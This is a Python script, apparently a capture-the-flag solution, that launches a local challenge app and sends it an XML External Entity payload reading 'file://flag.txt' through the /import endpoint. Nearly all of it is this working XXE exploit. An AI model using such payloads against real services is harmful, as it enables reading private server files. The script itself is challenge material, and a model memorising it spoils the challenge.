#!/usr/bin/env python3
from __future__ import annotations

import os, socket, subprocess, sys, time, urllib.request
from pathlib import Path


def start(app: Path, port: int):
    env = os.environ.copy()
    env["PORT"] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit("server not ready")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    proc = start(root / "attachments" / "app.py", 18088)
    try:
        xml = '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "file://flag.txt">]><data>&x;</data>'.encode()
        req = urllib.request.Request("http://127.0.0.1:18088/import", data=xml, method="POST")
        body = urllib.request.urlopen(req).read().decode()
        print(body.strip())
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    main()
